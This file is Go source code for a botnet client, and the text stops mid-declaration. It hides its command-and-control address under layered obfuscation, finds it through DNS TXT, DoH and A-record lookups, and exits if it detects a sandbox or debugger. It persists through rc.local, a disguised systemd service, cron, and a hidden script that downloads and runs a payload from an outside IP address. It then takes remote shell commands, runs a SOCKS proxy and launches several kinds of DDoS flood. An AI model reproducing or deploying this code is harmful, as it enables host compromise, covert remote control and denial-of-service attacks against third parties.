package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
)

//run setup.py dont try to change this yourself

// Debug mode - set to true to see DNS resolution logs
var debugMode = true

// Obfuscated config - multi-layer encoding (setup.py generates this)
const gothTits = "d3mVEFASkzds12Q/+twaQgBcQNODMUbks24bq/LbU4BUr" //change me run setup.py
const cryptSeed = "7b32e8e1"                                        //change me run setup.py

// DNS servers for TXT record lookups (shuffled for load balancing)
var lizardSquad = []string{
	"1.1.1.1:53",        // Cloudflare
	"8.8.8.8:53",        // Google
	"9.9.9.9:53",        // Quad9
	"208.67.222.222:53", // OpenDNS
	"1.0.0.1:53",        // Cloudflare secondary
}

// Anti-analysis: split key derivation across functions
func mew() byte     { return byte(0x31 ^ 0x64) }
func mewtwo() byte  { return byte(0x72 ^ 0x17) }
func celebi() byte  { return byte(0x93 ^ 0xc6) }
func jirachi() byte { return byte(0xa4 ^ 0x81) }

// deriveKey => charizard - Derive runtime key from seed + binary entropy
func charizard(seed string) []byte {
	h := md5.New()
	h.Write([]byte(seed))
	h.Write([]byte{mew(), mewtwo(), celebi(), jirachi()})
	entropy := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE}
	for i := range entropy {
		entropy[i] ^= byte(len(seed) + i*17)
	}
	h.Write(entropy)
	return h.Sum(nil)
}

// streamDecrypt => blastoise
func blastoise(data []byte, key []byte) []byte {
	s := make([]byte, 256)
	for i := range s {
		s[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%len(key)])) % 256
		s[i], s[j] = s[j], s[i]
	}
	result := make([]byte, len(data))
	i, j := 0, 0
	for k := range data {
		i = (i + 1) % 256
		j = (j + int(s[i])) % 256
		s[i], s[j] = s[j], s[i]
		result[k] = data[k] ^ s[(int(s[i])+int(s[j]))%256]
	}
	return result
}

// decodeObfuscated => venusaur
func venusaur(encoded string) string {
	layer1, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return ""
	}
	key := charizard(cryptSeed)
	layer2 := make([]byte, len(layer1))
	for i := range layer1 {
		layer2[i] = layer1[i] ^ key[i%len(key)]
	}
	layer3 := blastoise(layer2, key)
	result := make([]byte, len(layer3))
	for i := range layer3 {
		b := layer3[i]
		b = ((b << 3) | (b >> 5))
		b ^= 0xAA
		result[i] = b
	}
	if len(result) < 5 {
		return ""
	}
	payload := result[:len(result)-4]
	checksum := result[len(result)-4:]
	h := md5.New()
	h.Write(payload)
	expected := h.Sum(nil)[:4]
	for i := range checksum {
		if checksum[i] != expected[i] {
			return ""
		}
	}
	return string(payload)
}

// debugLog => deoxys
func deoxys(format string, args ...interface{}) {
	if debugMode {
		fmt.Printf("[DEBUG] "+format+"\n", args...)
	}
}

// lookupTXTRecord => darkrai
func darkrai(domain string) (string, error) {
	deoxys("darkrai: Looking up TXT for domain: %s", domain)
	servers := make([]string, len(lizardSquad))
	copy(servers, lizardSquad)
	rand.Shuffle(len(servers), func(i, j int) {
		servers[i], servers[j] = servers[j], servers[i]
	})
	var lastErr error
	for _, server := range servers {
		deoxys("darkrai: Trying DNS server: %s", server)
		c := new(dns.Client)
		c.Timeout = 5 * time.Second
		c.Net = "udp"
		m := new(dns.Msg)
		m.SetQuestion(dns.Fqdn(domain), dns.TypeTXT)
		m.RecursionDesired = true
		r, rtt, err := c.Exchange(m, server)
		if err != nil {
			deoxys("darkrai: DNS error from %s: %v", server, err)
			lastErr = err
			continue
		}
		deoxys("darkrai: Got response from %s in %v, rcode=%d, answers=%d", server, rtt, r.Rcode, len(r.Answer))
		if r.Rcode != dns.RcodeSuccess {
			lastErr = fmt.Errorf("DNS query failed with code: %d", r.Rcode)
			deoxys("darkrai: Bad rcode: %d", r.Rcode)
			continue
		}
		for _, ans := range r.Answer {
			deoxys("darkrai: Answer type: %T, value: %v", ans, ans)
			if txt, ok := ans.(*dns.TXT); ok {
				deoxys("darkrai: TXT record found with %d strings", len(txt.Txt))
				for _, t := range txt.Txt {
					deoxys("darkrai: TXT value: '%s'", t)
					t = strings.TrimSpace(t)
					if strings.HasPrefix(t, "c2=") {
						result := strings.TrimPrefix(t, "c2=")
						deoxys("darkrai: Found c2= prefix, returning: %s", result)
						return result, nil
					}
					if strings.HasPrefix(t, "ip=") {
						result := strings.TrimPrefix(t, "ip=")
						deoxys("darkrai: Found ip= prefix, returning: %s", result)
						return result, nil
					}
					// Try raw IP:port format
					if strings.Contains(t, ":") && !strings.Contains(t, " ") {
						parts := strings.Split(t, ":")
						if len(parts) == 2 {
							if net.ParseIP(parts[0]) != nil || arceus(parts[0]) {
								deoxys("darkrai: Found raw IP:port, returning: %s", t)
								return t, nil
							}
						}
					}
					// Try plain IP address (no port) - append default 443
					if net.ParseIP(t) != nil {
						result := t + ":443"
						deoxys("darkrai: Found plain IP, appending :443, returning: %s", result)
						return result, nil
					}
				}
			}
		}
		lastErr = fmt.Errorf("no valid C2 address in TXT records")
		deoxys("darkrai: No valid C2 found in TXT records from %s", server)
	}
	deoxys("darkrai: All servers failed, last error: %v", lastErr)
	return "", lastErr
}

// lookupTXTviaDoH => palkia
func palkia(domain string) (string, error) {
	deoxys("palkia: Starting DoH TXT lookup for: %s", domain)
	dohServers := []string{
		"https://cloudflare-dns.com/dns-query",
		"https://dns.google/dns-query",
		"https://dns.quad9.net/dns-query",
	}
	for _, server := range dohServers {
		dohURL := fmt.Sprintf("%s?name=%s&type=TXT", server, domain)
		deoxys("palkia: Trying DoH server: %s", dohURL)
		req, err := http.NewRequest("GET", dohURL, nil)
		if err != nil {
			deoxys("palkia: Request create error: %v", err)
			continue
		}
		req.Header.Set("Accept", "application/dns-json")
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			deoxys("palkia: Request error: %v", err)
			continue
		}
		deoxys("palkia: Got response status: %d", resp.StatusCode)
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}
		var dnsResp struct {
			Status int `json:"Status"`
			Answer []struct {
				Type int    `json:"type"`
				Data string `json:"data"`
			} `json:"Answer"`
		}
		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
			deoxys("palkia: JSON decode error: %v", err)
			resp.Body.Close()
			continue
		}
		resp.Body.Close()
		deoxys("palkia: DNS status=%d, answers=%d", dnsResp.Status, len(dnsResp.Answer))
		for _, ans := range dnsResp.Answer {
			deoxys("palkia: Answer type=%d data='%s'", ans.Type, ans.Data)
			// TXT records are type 16
			if ans.Type != 16 {
				continue
			}
			data := strings.Trim(ans.Data, "\"")
			data = strings.TrimSpace(data)
			deoxys("palkia: Parsed TXT data: '%s'", data)
			if strings.HasPrefix(data, "c2=") {
				result := strings.TrimPrefix(data, "c2=")
				deoxys("palkia: Found c2=, returning: %s", result)
				return result, nil
			}
			if strings.HasPrefix(data, "ip=") {
				result := strings.TrimPrefix(data, "ip=")
				deoxys("palkia: Found ip=, returning: %s", result)
				return result, nil
			}
			if strings.Contains(data, ":") && !strings.Contains(data, " ") {
				parts := strings.Split(data, ":")
				if len(parts) == 2 {
					deoxys("palkia: Found raw IP:port, returning: %s", data)
					return data, nil
				}
			}
			// Try plain IP address (no port) - append default 443
			if net.ParseIP(data) != nil {
				result := data + ":443"
				deoxys("palkia: Found plain IP, appending :443, returning: %s", result)
				return result, nil
			}
		}
	}
	deoxys("palkia: All DoH servers failed")
	return "", fmt.Errorf("DoH TXT lookup failed")
}

// lookupARecord => rayquaza - Fallback to A record lookup
func rayquaza(domain string) (string, error) {
	deoxys("rayquaza: A record fallback for: %s", domain)
	// Try system resolver first
	ips, err := net.LookupHost(domain)
	if err == nil && len(ips) > 0 {
		deoxys("rayquaza: System resolver returned: %s", ips[0])
		return ips[0], nil
	}
	deoxys("rayquaza: System resolver failed: %v, trying DoH", err)

	// Fallback to DoH A record
	dohServers := []string{
		"https://cloudflare-dns.com/dns-query",
		"https://dns.google/dns-query",
	}
	for _, server := range dohServers {
		dohURL := fmt.Sprintf("%s?name=%s&type=A", server, domain)
		deoxys("rayquaza: Trying DoH A record: %s", dohURL)
		req, err := http.NewRequest("GET", dohURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Accept", "application/dns-json")
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			deoxys("rayquaza: DoH error: %v", err)
			continue
		}
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}
		var dnsResp struct {
			Answer []struct {
				Type int    `json:"type"`
				Data string `json:"data"`
			} `json:"Answer"`
		}
		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
			resp.Body.Close()
			continue
		}
		resp.Body.Close()
		for _, ans := range dnsResp.Answer {
			// A records are type 1
			if ans.Type == 1 {
				deoxys("rayquaza: Found A record: %s", ans.Data)
				return ans.Data, nil
			}
		}
	}
	return "", fmt.Errorf("A record lookup failed")
}

// isValidHostname => arceus
func arceus(h string) bool {
	if len(h) == 0 || len(h) > 253 {
		return false
	}
	for _, c := range h {
		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
			(c >= '0' && c <= '9') || c == '-' || c == '.') {
			return false
		}
	}
	return true
}

// requestMore => dialga
func dialga() string {
	deoxys("dialga: Starting C2 resolution")
	decoded := venusaur(gothTits)
	deoxys("dialga: Decoded config: '%s'", decoded)
	if decoded == "" {
		deoxys("dialga: Failed to decode config, returning empty")
		return ""
	}
	// Check if already IP:port format
	if strings.Contains(decoded, ":") {
		parts := strings.Split(decoded, ":")
		if len(parts) == 2 && net.ParseIP(parts[0]) != nil {
			deoxys("dialga: Config is already IP:port format: %s", decoded)
			return decoded
		}
	}
	// Extract domain and port
	domain := decoded
	defaultPort := "443"
	if strings.Contains(domain, ":") {
		parts := strings.Split(domain, ":")
		domain = parts[0]
		if len(parts) > 1 {
			defaultPort = parts[1]
		}
	}
	deoxys("dialga: Domain=%s, Port=%s", domain, defaultPort)

	// Method 1: DNS TXT record lookup
	deoxys("dialga: Trying TXT record lookup via UDP DNS")
	if c2Addr, err := darkrai(domain); err == nil && c2Addr != "" {
		deoxys("dialga: TXT lookup success: %s", c2Addr)
		return c2Addr
	}

	// Method 2: DoH TXT record lookup
	deoxys("dialga: Trying TXT record lookup via DoH")
	if c2Addr, err := palkia(domain); err == nil && c2Addr != "" {
		deoxys("dialga: DoH TXT lookup success: %s", c2Addr)
		return c2Addr
	}

	// Method 3: Fallback to A record (domain points directly to C2)
	deoxys("dialga: TXT lookups failed, falling back to A record")
	if ip, err := rayquaza(domain); err == nil && ip != "" {
		result := fmt.Sprintf("%s:%s", ip, defaultPort)
		deoxys("dialga: A record fallback success: %s", result)
		return result
	}

	// Last resort: return decoded value as-is
	deoxys("dialga: All resolution methods failed, returning decoded: %s", decoded)
	return decoded
}

const (
	magicCode       = "saj95sciW1zQSXD9" //change this per campaign
	protocolVersion = "r2.7-stable"      //change this per campaign
)

var (
	fancyBear        = 5 * time.Second
	cozyBear         = 2024
	lazarusListener  net.Listener
	lazarusActive    bool
	lazarusMutex     sync.Mutex
	lazarusCount     int32
	lazarusMax       int32 = 100
	aptStopChan            = make(chan struct{})
	aptStopMutex     sync.Mutex
	aptAttackRunning bool
)

const equationGroup = 256

// appendToFile => sandworm
func sandworm(path, line string, perm os.FileMode) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, perm)
	if err != nil {
		return err
	}
	defer f.Close()
	_, _ = f.WriteString(line)
	return nil
}

// RandString => turla
func turla(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// randName => kimsuky
func kimsuky() string {
	dict := []string{"update", "syncd", "logger", "system", "crond", "netd"}
	return dict[rand.Intn(len(dict))] + "-" + turla(4)
}

// createCronJob => carbanak
func carbanak(hiddenDir string) {
	cronJob := fmt.Sprintf("* * * * * bash %s/.redis_script.sh > /dev/null 2>&1", hiddenDir)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
	_ = cmd.Run()
}

// persistRcLocal => fin7
func fin7() {
	rc := "/etc/rc.local"
	if _, err := os.Stat(rc); err != nil {
		return
	}
	exe, _ := os.Executable()
	b, err := os.ReadFile(rc)
	if err != nil || strings.Contains(string(b), exe) {
		return
	}
	line := exe + " # " + kimsuky() + "\n"
	_ = sandworm(rc, line, 0700)
}

// setupPersistence => dragonfly
func dragonfly() {
	hiddenDir := "/var/lib/.redis_helper"
	scriptPath := filepath.Join(hiddenDir, ".redis_script.sh")
	programPath := filepath.Join(hiddenDir, ".redis_process")
	url := "http://185.247.224.107/mods/installer"
	_ = os.MkdirAll(hiddenDir, 0755)
	scriptContent := fmt.Sprintf("#!/bin/bash\nURL=\"%s\"\nPROGRAM_PATH=\"%s\"\nif [ ! -f \"$PROGRAM_PATH\" ]; then\nwget -O $PROGRAM_PATH $URL\nchmod +x $PROGRAM_PATH\nfi\nif ! pgrep -x \".redis_process\" > /dev/null; then\n$PROGRAM_PATH &\nfi\n", url, programPath)
	_ = os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	serviceContent := "[Unit]\nDescription=System Helper Service\nAfter=network.target\n[Service]\nExecStart=/var/lib/.redis_helper/.redis_script.sh\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\n"
	servicePath := "/etc/systemd/system/redis-helper.service"
	_ = os.WriteFile(servicePath, []byte(serviceContent), 0644)
	cmd := exec.Command("systemctl", "enable", "--now", "redis-helper.service")
	_ = cmd.Run()
	carbanak(hiddenDir)
}

// isSandboxed => winnti
func winnti() bool {
	vmIndicators := []string{"vmware", "vbox", "virtualbox", "qemu", "firejail", "bubblewrap", "gvisor", "kata", "cuckoo", "joesandbox", "cape", "any.run", "hybrid-analysis"}
	if procs, err := os.ReadDir("/proc"); err == nil {
		for _, proc := range procs {
			if !proc.IsDir() {
				continue
			}
			if _, err := strconv.Atoi(proc.Name()); err != nil {
				continue
			}
			if cmdline, err := os.ReadFile("/proc/" + proc.Name() + "/cmdline"); err == nil {
				cmdStr := strings.ToLower(string(cmdline))
				for _, indicator := range vmIndicators {
					if strings.Contains(cmdStr, indicator) {
						return true
					}
				}
			}
		}
	}
	analysisTools := []string{"/usr/bin/strace", "/usr/bin/ltrace", "/usr/bin/gdb", "/usr/bin/radare2", "/usr/bin/ghidra", "/usr/bin/ida", "/usr/bin/wireshark", "/usr/bin/tshark", "/usr/bin/tcpdump"}
	for _, tool := range analysisTools {
		if _, err := os.Stat(tool); err == nil {
			if out, err := exec.Command("pgrep", "-f", filepath.Base(tool)).Output(); err == nil {
				if len(strings.TrimSpace(string(out))) > 0 {
					return true
				}
			}
		}
	}
	if ppid := os.Getppid(); ppid > 1 {
		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid)); err == nil {
			parentCmd := strings.ToLower(string(cmdline))
			debuggers := []string{"gdb", "strace", "ltrace", "radare2", "rr"}
			for _, debugger := range debuggers {
				if strings.Contains(parentCmd, debugger) {
					return true
				}
			}
		}
	}
	return false
}

// parseC2Address => scarcruft
func scarcruft(address string) (string, string, error) {
	address = strings.TrimSpace(address)
	address = strings.TrimPrefix(address, "tcp://")
	address = strings.TrimPrefix(address, "http://")
	address = strings.TrimPrefix(address, "https://")
	parts := strings.Split(address, ":")
	if len(parts) != 2 {
		return "", "", fmt.Errorf("invalid address")
	}
	return parts[0], parts[1], nil
}

// connectViaTLS => gamaredon
func gamaredon(host, port string) (net.Conn, error) {
	tlsConfig := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	dialer := &net.Dialer{Timeout: 30 * time.Second}
	rawConn, err := dialer.Dial("tcp", net.JoinHostPort(host, port))
	if err != nil {
		return nil, err
	}
	tlsConn := tls.Client(rawConn, tlsConfig)
	tlsConn.SetDeadline(time.Now().Add(30 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return nil, err
	}
	tlsConn.SetDeadline(time.Time{})
	return tlsConn, nil
}

// generateBotID => mustangPanda
func mustangPanda() string {
	hostname, _ := os.Hostname()
	interfaces, _ := net.Interfaces()
	mac := "unknown"
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 && len(iface.HardwareAddr) > 0 {
			mac = iface.HardwareAddr.String()
			break
		}
	}
	data := fmt.Sprintf("%s:%s", hostname, mac)
	hash := fmt.Sprintf("%x", md5.Sum([]byte(data)))
	return hash[:8]
}

// generateAuthResponse => hafnium
func hafnium(challenge, secret string) string {
	h := md5.New()
	h.Write([]byte(challenge + secret + challenge))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

// detectArchitecture => charmingKitten
func charmingKitten() string {
	goarch := runtime.GOARCH
	osName := runtime.GOOS
	archMap := map[string]string{"386": "x86", "amd64": "x64", "arm": "ARM32", "arm64": "ARM64", "mips": "MIPS", "mips64": "MIPS64", "ppc64": "PowerPC64", "ppc64le": "PowerPC64LE", "s390x": "s390x", "wasm": "WebAssembly"}
	if arch, exists := archMap[goarch]; exists {
		if osName == "windows" {
			if goarch == "amd64" {
				return "Windows-x64"
			} else if goarch == "386" {
				return "Windows-x86"
			}
		} else if osName == "linux" {
			return "Linux-" + arch
		} else if osName == "darwin" {
			return "macOS-" + arch
		}
		return arch
	}
	return osName + "-" + goarch
}

// revilMem returns total system RAM in MB
func revilMem() int64 {
	var info syscall.Sysinfo_t
	if err := syscall.Sysinfo(&info); err != nil {
		return 0
	}
	return int64(info.Totalram * uint64(info.Unit) / 1024 / 1024)
}

// ExecuteShell => sidewinder
func sidewinder(cmd string) (string, error) {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	var stdout, stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr
	err := command.Run()
	if err != nil {
		return fmt.Sprintf("Error: %v\nStderr: %s", err, stderr.String()), err
	}
	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nStderr: " + stderr.String()
	}
	return output, nil
}

// ExecuteShellDetached => oceanLotus
func oceanLotus(cmd string) {
	go func() {
		args := []string{"sh", "-c", cmd}
		command := exec.Command(args[0], args[1:]...)
		command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
		command.Stdout = nil
		command.Stderr = nil
		command.Stdin = nil
		command.Start()
	}()
}

// ExecuteShellStreaming => machete
func machete(cmd string, conn net.Conn) error {
	args := []string{"sh", "-c", cmd}
	command := exec.Command(args[0], args[1:]...)
	stdout, err := command.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := command.StderrPipe()
	if err != nil {
		return err
	}
	if err := command.Start(); err != nil {
		return err
	}
	go func() {
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDOUT: %s\n", scanner.Text())))
		}
	}()
	go func() {
		scanner := bufio.NewScanner(stderr)
		for scanner.Scan() {
			conn.Write([]byte(fmt.Sprintf("STDERR: %s\n", scanner.Text())))
		}
	}()
	err = command.Wait()
	if err != nil {
		conn.Write([]byte(fmt.Sprintf("EXIT ERROR: %v\n", err)))
	} else {
		conn.Write([]byte("EXIT: Command completed successfully\n"))
	}
	return nil
}

// startSocksProxy => muddywater
func muddywater(port string, c2Conn net.Conn) error {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusActive {
		return fmt.Errorf("SOCKS proxy already running")
	}
	portNum, err := strconv.Atoi(port)
	if err != nil || portNum < 1 || portNum > 65535 {
		return fmt.Errorf("invalid port: %s", port)
	}
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return fmt.Errorf("failed to bind: %v", err)
	}
	lazarusListener = listener
	lazarusActive = true
	atomic.StoreInt32(&lazarusCount, 0)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				lazarusMutex.Lock()
				running := lazarusActive
				lazarusMutex.Unlock()
				if running {
					continue
				}
				return
			}
			if atomic.LoadInt32(&lazarusCount) >= lazarusMax {
				conn.Close()
				continue
			}
			atomic.AddInt32(&lazarusCount, 1)
			go func(c net.Conn) {
				defer atomic.AddInt32(&lazarusCount, -1)
				trickbot(c)
			}(conn)
		}
	}()
	return nil
}

// stopSocksProxy => emotet
func emotet() {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusListener != nil {
		lazarusListener.Close()
		lazarusListener = nil
	}
	lazarusActive = false
}

// handleSocksConnection => trickbot
func trickbot(clientConn net.Conn) {
	defer clientConn.Close()
	clientConn.SetDeadline(time.Now().Add(30 * time.Second))
	buf := make([]byte, 262)
	n, err := clientConn.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}
	clientConn.Write([]byte{0x05, 0x00})
	n, err = clientConn.Read(buf)
	if err != nil || n < 7 || buf[1] != 0x01 {
		clientConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	addrType := buf[3]
	var targetAddr string
	var targetPort uint16
	switch addrType {
	case 0x01:
		if n < 10 {
			return
		}
		targetAddr = net.IP(buf[4:8]).String()
		targetPort = uint16(buf[8])<<8 | uint16(buf[9])
	case 0x03:
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			return
		}
		targetAddr = string(buf[5 : 5+domainLen])
		targetPort = uint16(buf[5+domainLen])<<8 | uint16(buf[6+domainLen])
	case 0x04:
		if n < 22 {
			return
		}
		targetAddr = net.IP(buf[4:20]).String()
		targetPort = uint16(buf[20])<<8 | uint16(buf[21])
	default:
		clientConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	target := fmt.Sprintf("%s:%d", targetAddr, targetPort)
	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		clientConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	defer targetConn.Close()
	localAddr := targetConn.LocalAddr().(*net.TCPAddr)
	ip4 := localAddr.IP.To4()
	if ip4 == nil {
		ip4 = net.IPv4(0, 0, 0, 0)
	}
	response := []byte{0x05, 0x00, 0x00, 0x01}
	response = append(response, ip4...)
	response = append(response, byte(localAddr.Port>>8), byte(localAddr.Port))
	clientConn.Write(response)
	clientConn.SetDeadline(time.Time{})
	targetConn.SetDeadline(time.Time{})
	done := make(chan struct{}, 2)
	go func() {
		io.Copy(targetConn, clientConn)
		if tc, ok := targetConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	go func() {
		io.Copy(clientConn, targetConn)
		if tc, ok := clientConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	<-done
	<-done
}

// stopAllAttacks => pikachu
func pikachu() {
	aptStopMutex.Lock()
	defer aptStopMutex.Unlock()
	if aptAttackRunning {
		close(aptStopChan)
		aptStopChan = make(chan struct{})
		aptAttackRunning = false
	}
}

// getStopChan => raichu
func raichu() chan struct{} {
	aptStopMutex.Lock()
	defer aptStopMutex.Unlock()
	aptAttackRunning = true
	return aptStopChan
}

// handleCommand => blackEnergy
func blackEnergy(conn net.Conn, command string) error {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return fmt.Errorf("empty command")
	}
	cmd := fields[0]
	switch cmd {
	case "!shell", "!exec":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !shell <command>")
		}
		output, err := sidewinder(strings.Join(fields[1:], " "))
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
		} else {
			encoded := base64.StdEncoding.EncodeToString([]byte(output))
			conn.Write([]byte(fmt.Sprintf("OUTPUT_B64: %s\n", encoded)))
		}
		return nil
	case "!stream":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !stream <command>")
		}
		go machete(strings.Join(fields[1:], " "), conn)
		conn.Write([]byte("Streaming started\n"))
		return nil
	case "!detach", "!bg":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !detach <command>")
		}
		oceanLotus(strings.Join(fields[1:], " "))
		conn.Write([]byte("Command running in background\n"))
		return nil
	case "!stop":
		pikachu()
		conn.Write([]byte("STOP: All attacks terminated\n"))
		return nil
	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass":
		if len(fields) != 4 {
			return fmt.Errorf("invalid format")
		}
		target := fields[1]
		targetPort, _ := strconv.Atoi(fields[2])
		duration, _ := strconv.Atoi(fields[3])
		switch cmd {
		case "!udpflood":
			go snorlax(target, targetPort, duration)
		case "!tcpflood":
			go gengar(target, targetPort, duration)
		case "!http":
			go alakazam(target, targetPort, duration)
		case "!https", "!tls":
			go machamp(target, targetPort, duration)
		case "!cfbypass":
			go gyarados(target, targetPort, duration)
		case "!syn":
			go dragonite(target, targetPort, duration)
		case "!ack":
			go tyranitar(target, targetPort, duration)
		case "!gre":
			go metagross(target, duration)
		case "!dns":
			go salamence(target, targetPort, duration)
		}
		conn.Write([]byte(fmt.Sprintf("Attack started: %s on %s:%d for %d seconds\n", cmd, target, targetPort, duration)))
	case "!persist":
		go dragonfly()
		conn.Write([]byte("Persistence setup initiated\n"))
	case "!kill":
		conn.Write([]byte("Bot shutting down\n"))
		os.Exit(0)
	case "!info":
		hostname, _ := os.Hostname()
		arch := charmingKitten()
		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", hostname, arch, mustangPanda(), runtime.GOOS)
		conn.Write([]byte(fmt.Sprintf("INFO: %s\n", info)))
	case "!socks":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !socks <port>")
		}
		err := muddywater(fields[1], conn)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("SOCKS ERROR: %v\n", err)))
		} else {
			conn.Write([]byte(fmt.Sprintf("SOCKS: Proxy started on port %s\n", fields[1])))
		}
	case "!stopsocks":
		emotet()
		conn.Write([]byte("SOCKS: Proxy stopped\n"))
	default:
		return fmt.Errorf("unknown command")
	}
	return nil
}

// handleC2Connection => anonymousSudan
func anonymousSudan(conn net.Conn) {
	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	challengeMsg, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return
	}
	challengeMsg = strings.TrimSpace(challengeMsg)
	if !strings.HasPrefix(challengeMsg, "AUTH_CHALLENGE:") {
		conn.Close()
		return
	}
	challenge := strings.TrimPrefix(challengeMsg, "AUTH_CHALLENGE:")
	challenge = strings.TrimSpace(challenge)
	response := hafnium(challenge, magicCode)
	conn.Write([]byte(response + "\n"))
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	authResult, err := reader.ReadString('\n')
	if err != nil || strings.TrimSpace(authResult) != "AUTH_SUCCESS" {
		conn.Close()
		return
	}
	botID := mustangPanda()
	arch := charmingKitten()
	ram := revilMem()
	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d\n", protocolVersion, botID, arch, ram)))
	for {
		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
		command, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		command = strings.TrimSpace(command)
		if command == "PING" {
			conn.Write([]byte("PONG\n"))
			continue
		}
		if err := blackEnergy(conn, command); err != nil {
			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
		}
	}
	conn.Close()
}

func main() {
	if winnti() {
		os.Exit(200)
	}
	fin7()
	c2Address := dialga()
	if c2Address == "" {
		return
	}
	host, port, err := scarcruft(c2Address)
	if err != nil {
		return
	}
	for {
		conn, err := gamaredon(host, port)
		if err != nil {
			time.Sleep(fancyBear)
			continue
		}
		anonymousSudan(conn)
		time.Sleep(fancyBear)
	}
}

// DNS response type => magikarp
type magikarp struct {
	Answer []struct {
		Data string `json:"data"`
	} `json:"Answer"`
}

// resolveTarget => lucario
func lucario(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}
	if idx := strings.Index(target, ":"); idx != -1 {
		target = target[:idx]
	}
	ips, err := net.LookupHost(target)
	if err == nil && len(ips) > 0 {
		return ips[0], nil
	}
	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", fmt.Errorf("error: %v", err)
	}
	req.Header.Set("Accept", "application/dns-json")
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("error: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("status: %d", resp.StatusCode)
	}
	var dnsResp magikarp
	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
		return "", fmt.Errorf("decode error: %v", err)
	}
	if len(dnsResp.Answer) == 0 {
		return "", fmt.Errorf("no records")
	}
	return dnsResp.Answer[0].Data, nil
}

var eevee = []string{
